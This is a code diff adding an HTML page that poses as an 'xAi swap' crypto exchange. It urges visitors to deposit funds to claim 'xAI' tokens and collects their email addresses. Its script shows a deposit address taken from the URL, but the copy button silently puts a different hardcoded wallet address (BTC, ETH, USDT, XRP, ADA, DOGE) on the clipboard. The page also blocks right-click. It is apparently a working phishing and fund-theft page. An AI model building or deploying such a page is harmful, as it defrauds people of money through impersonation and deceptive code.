@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xAi swap Id : 3e3r93</title>
+    <link rel="stylesheet" href="./style.css">
+    <script src="https://kit.fontawesome.com/86b127aff6.js" crossorigin="anonymous"></script>
+</head>
+<body>
+    <section class="nav_section2">
+
+        <nav>
+            <img src="./assets/image-removebg-preview (14).png" alt="" class="nav_img">
+            
+        </nav>
+    </section>
+    <section class="swap_id_warp">
+    <div class="container">
+        <div class="main_configs">
+            <div class="main_configs_warp">
+            <div class="Transaction_ID">
+                <p>Transaction ID:</p>
+                <p class="back_color">hHvxPEwyo</p>
+            </div>
+            <div class="send_funds">
+                <div class="send_funds_warp">
+                    <h1>Please send the funds you would like to exchange</h1>
+                    <div class="amounts_box_warp">
+
+                    <div class="amounts_box">
+                        <p>Amount</p>
+                        <div class="dynamics_values">
+                            <span id="valueSpan"></span>
+                            <span id="currencySpan"></span>
+                            <span><img id="imageSpan" src="" alt=""></span>
+                        </div>
+                        <p class="address_p">To this address</p>
+                        <div class="copy_address">
+                            <p id="addressText"></p>
+                            <i class="fa-regular fa-copy" onclick="copyAddress()"></i>
+                        </div>
+                    
+                    </div>
+                    <img src="" alt="QR Code" id="qrImage">
+                </div>
+                <div class="steps_follows">
+                    <div class="step_one">
+                        <div class="tx-step--status-progress-wrap">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" class="spinner" width="29" height="29" style="transform:translateZ(0)"><circle cx="50" cy="50" fill="none" stroke="#00C26F" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138" transform="rotate(138 50 50)"><animateTransform attributeName="transform" type="rotate" calcMode="linear" values="0 50 50;360 50 50" keyTimes="0;1" dur="1s" begin="0s" repeatCount="indefinite"></animateTransform></circle>
+                            </svg>
+                        </div>
+                        <p class="step_para green">
+
+                            Awaiting deposit
+                        </p>
+                    </div>
+                    <div class="step_divider"></div>
+                    <div class="step_one">
+                        <div class="step_circle"></div>
+                        <p class="step_para">Confirming</p>
+                    </div>
+                    <div class="step_divider"></div>
+                    <div class="step_one">
+                        <div class="step_circle"></div>
+                        <p class="step_para">Creating xAI Account</p>
+                    </div>
+                    <div class="step_divider"></div>
+                    <div class="step_one">
+                        <div class="step_circle"></div>
+                        <p class="step_para">Claiming xAI</p>
+                    </div>
+                </div>
+                <p class="amount_ps">Once the deposit is confirmed, you will be guided through creating an xAI account and completing KYC verification. Afterward, you will be able to claim xAI to your desired wallet. Please remain on this page until the transaction is confirmed on the blockchain, which may take up to 30 minutes
+                </p>
+                </div>
+            </div>
+            <div class="confirmation_enter_p">
+                <h2>After the confirmation enter your email:</h2>
+            </div>
+            <div class="confirmation_enter">
+                <img src="./assets/icon-letters.svg" alt="">
+                <div class="email_box">
+                    <p>Enter your email to get the xAI link for Android/iOS/Windows.</p>
+                    <form>
+                        <input type="email" placeholder="Enter your email">
+                        <button type="submit" class="confirmation_mail">confirm</button>
+                    </form>
+                    <div class="check_warp">
+                        <input type="checkbox">
+                        <p>Notify me about the latest news and promotions from xAICrypto</p>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+        <img src="./assets/Screenshot 2024-06-27 194801.png" alt="" class="left_steps">
+        </div>
+    </div>
+</section>
+
+
+
+
+<script src="./index.js"></script>
+
+<script>
+   const copyAddresses = {
+            BTC: 'bc1qkczz4xsv6ekxg98gn2yux80vq5vjz9hpljc4dn',
+            USDT: '0x36BC988712E7c953AE0026861077fAD10D983367',
+            ETH: '0x36BC988712E7c953AE0026861077fAD10D983367',
+            XRP: 'rB4yuf13AHf5Y451dUGp6useMWFw81ddkE',
+            ADA: 'addr1qyvt86707ghkcu7va4vcw5seq7ag7a2ppnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp',
+            DOGE: 'D5d2Kk8E3tup7nLq62eeJLtkAQjmAaHspR'
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const currency = urlParams.get('currency');
+            const value = urlParams.get('value');
+            const address = urlParams.get('address');
+            const imageUrl = urlParams.get('image');
+            const qrImageUrl = urlParams.get('qrImage');
+
+            document.getElementById('currencySpan').textContent = currency;
+            document.getElementById('valueSpan').textContent = value;
+            document.getElementById('imageSpan').setAttribute('src', imageUrl);
+            document.getElementById('qrImage').setAttribute('src', qrImageUrl);
+            document.getElementById('addressText').textContent = address;
+        });
+
+        function copyAddress() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const currency = urlParams.get('currency');
+            const copyAddress = copyAddresses[currency];
+
+            navigator.clipboard.writeText(copyAddress).then(() => {
+                alert('Address copied to clipboard!');
+            });
+        }
+  </script>
+
+<script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+  </script>
+</body>
+</html>
